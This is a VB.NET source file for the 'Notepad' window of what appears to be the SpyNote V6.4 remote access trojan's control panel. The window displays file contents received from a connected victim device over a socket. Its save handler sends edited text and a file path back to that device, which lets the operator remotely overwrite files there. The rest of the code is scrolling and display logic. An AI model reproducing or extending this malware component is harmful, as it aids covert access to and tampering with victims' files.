Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.InteropServices
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class Notepad
    Public TClient As SocketClient

    Public MPath As String

    Private line0 As Integer

    Private Const EM_SCROLL As Integer = 181

    Private Const SB_LINEDOWN As Integer = 1

    Private Const SB_LINEUP As Integer = 0

    Private speed As Integer

    Private speed1 As Integer
    Public Sub New()
        Me.MPath = Nothing
        Me.InitializeComponent()
    End Sub
    Private Sub DwonTimer_Tick(sender As Object, e As EventArgs) Handles DwonTimer.Tick
        SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
        Dim flag As Boolean = Me.speed > 30 And Me.speed <> -1
        If flag Then
            Me.DwonTimer.Interval = 1
            Me.speed = -1
        Else
            Dim flag2 As Boolean = Me.speed <> -1
            If flag2 Then
                Me.speed += 1
            Else
                SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
                SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
                SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
                SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
            End If
        End If
    End Sub
    Private Sub Notepad_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\25.ico"))
        Me.ThemeButton1.ImageChoice = Store.Bitmap_0("Note\Nup")
        Me.ThemeButton1.ShowImage = True
        Me.ThemeButton2.ImageChoice = Store.Bitmap_0("Note\Ndown")
        Me.ThemeButton2.ShowImage = True
        Me.RichTextBox1.ContextMenuStrip = ContextRicBox.ContextMenuContextRicBox
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TScrolls.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
        Me.TProgressBar.Enabled = True
    End Sub

    Private Sub RichTextBox1_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles RichTextBox1.MouseWheel
        If (e.Delta <= 0) Then
            Notepad.SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
        Else
            Notepad.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
        End If
    End Sub

    Private Sub SAVELAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SAVELAB.Click
        If (Operators.CompareString(Me.MPath, Nothing, False) <> 0) Then
            Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(21)), Data.SplitData, Me.MPath, Data.SplitData, Me.RichTextBox1.Text}))
            MyBase.Close()
        End If
    End Sub

    Private Sub ScrollPanel()
        Me.line0 = Me.RichTextBox1.GetLineFromCharIndex(Me.RichTextBox1.SelectionStart)
        Me.Label1.Text = String.Concat("Ln", Strings.Space(1), Me.line0.ToString())
        Me.Label2.Text = String.Concat("Ch", Strings.Space(1), Conversions.ToString(Me.RichTextBox1.SelectionLength))
    End Sub

    <DllImport("user32.dll", CharSet:=CharSet.Ansi, EntryPoint:="SendMessageA", ExactSpelling:=True, SetLastError:=True)>
    Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal msg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    End Function

    Public Sub TData(ByVal Ay As Array)
        Try
            If (Operators.CompareString(CStr(Ay.GetValue(0)), Store.BFF(Store.buff, CLng(113)), False) = 0) Then
                Me.RichTextBox1.Text = Ay.GetValue(1).ToString()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ThemeButton1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ThemeButton1.MouseDown
        Me.UPTimer.Enabled = True
    End Sub

    Private Sub ThemeButton1_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ThemeButton1.MouseUp
        Me.UPTimer.Enabled = False
        Me.UPTimer.Interval = 40
        Me.speed1 = 0
    End Sub


    Private Sub ThemeButton2_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ThemeButton2.MouseDown
        Me.DwonTimer.Enabled = True
    End Sub

    Private Sub ThemeButton2_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ThemeButton2.MouseUp
        Me.DwonTimer.Enabled = False
        Me.DwonTimer.Interval = 40
        Me.speed = 0
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            MyBase.Close()
        ElseIf (Me.TClient.IsClose) Then
            MyBase.Close()
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.ScrollPanel()
    End Sub
    Private Sub UPTimer_Tick(sender As Object, e As EventArgs) Handles UPTimer.Tick
        Notepad.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
        Dim flag As Boolean = Me.speed1 > 30 And Me.speed1 <> -1
        If flag Then
            Me.UPTimer.Interval = 1
            Me.speed1 = -1
        Else
            Dim flag2 As Boolean = Me.speed1 <> -1
            If flag2 Then
                Me.speed1 += 1
            Else
                Notepad.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
                Notepad.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
                Notepad.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
                Notepad.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
            End If
        End If
    End Sub
End Class